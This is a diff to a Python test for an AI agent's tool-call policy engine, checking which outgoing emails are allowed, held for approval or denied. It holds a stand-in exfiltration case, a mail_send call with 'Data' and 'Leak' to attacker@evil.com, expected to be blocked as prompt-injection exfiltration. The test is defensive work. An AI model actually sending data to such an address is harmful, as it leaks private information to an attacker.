@@ -129,15 +129,24 @@ def test_policy_engine_enforces_rules_and_restrictions() -> None:
     )
     assert decision_file_ok.effect == PolicyEffect.ALLOW
 
-    # 3. External email requires approval
+    # 3. External unlisted email requires approval
     decision_ext_email = engine.evaluate(
         tool_name="mail_send",
-        tool_args={"recipient": "external_attacker@evil.com", "subject": "Data", "body": "Leak"},
+        tool_args={"recipient": "consultant@external-partner.org", "subject": "Data", "body": "Status"},
         risk_tier=RiskTier.EXTERNAL,
     )
     assert decision_ext_email.effect == PolicyEffect.REQUIRE_APPROVAL
     assert decision_ext_email.rule_id == "external_communication_approval"
     assert decision_ext_email.approver_role == "finance_manager"
+
+    # Egress denied domain is DENIED
+    decision_denied_domain = engine.evaluate(
+        tool_name="mail_send",
+        tool_args={"recipient": "attacker@evil.com", "subject": "Data", "body": "Leak"},
+        risk_tier=RiskTier.EXTERNAL,
+    )
+    assert decision_denied_domain.effect == PolicyEffect.DENY
+    assert decision_denied_domain.rule_id == "prompt_injection_exfiltration_blocked"
 
     # Internal email to company.com is ALLOWED
     decision_int_email = engine.evaluate(
